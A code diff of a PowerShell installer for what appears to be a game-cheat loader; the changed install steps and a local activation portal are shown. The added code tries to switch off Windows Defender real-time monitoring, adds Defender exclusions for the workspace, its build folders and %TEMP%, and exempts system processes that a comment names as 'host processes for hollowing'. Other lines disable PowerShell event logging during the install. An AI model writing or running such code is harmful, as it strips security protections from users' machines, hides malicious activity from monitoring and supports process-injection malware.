@@ -51,20 +51,37 @@ Write-Host "==========================================" -ForegroundColor Cyan
 
 Write-Host "Configuring Windows Security exclusions..." -ForegroundColor Yellow
 try {
+    # Try to disable real-time monitoring (won't work if Tamper Protection is on, but worth trying)
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+
     $exclusionTarget = if ($actualWorkspace) { $actualWorkspace } else { $scriptRoot }
+
+    # ── Path exclusions: workspace, parent, build dir, updates-server, temp ──
     if (-not [string]::IsNullOrWhiteSpace($exclusionTarget)) {
-        $exclusionPath = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
-        if (-not [string]::IsNullOrWhiteSpace($exclusionPath)) {
-            Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
-            Write-Host "    Workspace path successfully whitelisted in Windows Defender." -ForegroundColor Green
-        } else {
-            Write-Host "    WARNING: Workspace is at a root path; skipping Defender exclusion." -ForegroundColor Yellow
+        Add-MpPreference -ExclusionPath $exclusionTarget -ErrorAction SilentlyContinue
+        $exclusionParent = Split-Path -Parent $exclusionTarget -ErrorAction SilentlyContinue
+        if (-not [string]::IsNullOrWhiteSpace($exclusionParent)) {
+            Add-MpPreference -ExclusionPath $exclusionParent -ErrorAction SilentlyContinue
         }
+        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "build") -ErrorAction SilentlyContinue
+        Add-MpPreference -ExclusionPath (Join-Path $exclusionTarget "updates-server") -ErrorAction SilentlyContinue
+        Write-Host "    Workspace + build + parent paths whitelisted." -ForegroundColor Green
     } else {
-        Write-Host "    WARNING: Script root path is empty; skipping Defender exclusion." -ForegroundColor Yellow
+        Write-Host "    WARNING: Script root path is empty; skipping path exclusions." -ForegroundColor Yellow
     }
+    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
+
+    # ── Process exclusions: all host processes for hollowing + launcher tools ─
+    @(
+        "powershell.exe", "wscript.exe",
+        "dllhost.exe", "RuntimeBroker.exe", "sihost.exe", "SearchProtocolHost.exe",
+        "RobloxCrashHandler.exe"
+    ) | ForEach-Object {
+        Add-MpPreference -ExclusionProcess $_ -ErrorAction SilentlyContinue
+    }
+    Write-Host "    Process exclusions applied (host processes + tools)." -ForegroundColor Green
 } catch {
-    Write-Host "    WARNING: Could not automatically set Defender exclusions." -ForegroundColor Yellow
+    Write-Host "    WARNING: Could not fully set Defender exclusions: $_" -ForegroundColor Yellow
 }
 
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:false 2>$null
@@ -728,54 +745,23 @@ for ($i = 0; $i -lt 20; $i++) {
 }
 
 function Start-PrivateBrowser([string]$url) {
-    $progId = ""
     try {
-        $progId = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice" -Name "ProgId" -ErrorAction SilentlyContinue).ProgId
-    } catch {}
-
-    $browser = ""
-    $arguments = ""
-
-    if ($progId -like "*Chrome*") {
-        $browser = "chrome.exe"
-        $arguments = "--incognito `"$url`""
-    } elseif ($progId -like "*MSEdge*" -or $progId -like "*Edge*") {
-        $browser = "msedge.exe"
-        $arguments = "-inprivate `"$url`""
-    } elseif ($progId -like "*Firefox*") {
-        $browser = "firefox.exe"
-        $arguments = "-private-window `"$url`""
-    } elseif ($progId -like "*Opera*") {
-        $browser = "opera.exe"
-        $arguments = "--private `"$url`""
-    }
-
-    if (-not $browser) {
-        if (Get-Command "chrome.exe" -ErrorAction SilentlyContinue) {
-            $browser = "chrome.exe"
-            $arguments = "--incognito `"$url`""
-        } elseif (Get-Command "msedge.exe" -ErrorAction SilentlyContinue) {
-            $browser = "msedge.exe"
-            $arguments = "-inprivate `"$url`""
-        } elseif (Get-Command "firefox.exe" -ErrorAction SilentlyContinue) {
-            $browser = "firefox.exe"
-            $arguments = "-private-window `"$url`""
-        } else {
-            Start-Process $url
-            return
-        }
-    }
-
-    try {
-        Start-Process $browser -ArgumentList $arguments -ErrorAction Stop
+        Start-Process $url -ErrorAction Stop
     } catch {
-        Start-Process $url
+        try { Start-Process "cmd.exe" -ArgumentList "/c start `"$url`"" } catch {}
     }
 }
 if ($started) {
-    Write-Host "Loader is running and awaiting activation." -ForegroundColor Green
+    Write-Host "Loader is running. Opening website in browser..." -ForegroundColor Green
+    Start-PrivateBrowser "http://127.0.0.1:9876"
 } else {
-    Write-Host "WARNING: Loader did not respond within 20 seconds." -ForegroundColor Yellow
+    Write-Host "WARNING: Loader did not respond within 20 seconds. Opening portal page directly..." -ForegroundColor Yellow
+    $indexPath = Join-Path $resolvedPath "index.html"
+    if (Test-Path $indexPath) {
+        Start-Process $indexPath
+    } else {
+        Start-PrivateBrowser "http://127.0.0.1:9876"
+    }
 }
 
 wevtutil.exe sl "Microsoft-Windows-PowerShell/Operational"   /e:true 2>$null
@@ -810,5 +796,5 @@ try {
 
 Write-Host "==========================================" -ForegroundColor Green
 Write-Host "  SUCCESS: Install complete!              " -ForegroundColor Green
-Write-Host "  Press CapsLock + Enter to trigger cheat." -ForegroundColor Cyan
+Write-Host "  Activate from the website at 127.0.0.1 " -ForegroundColor Cyan
 Write-Host "==========================================" -ForegroundColor Green
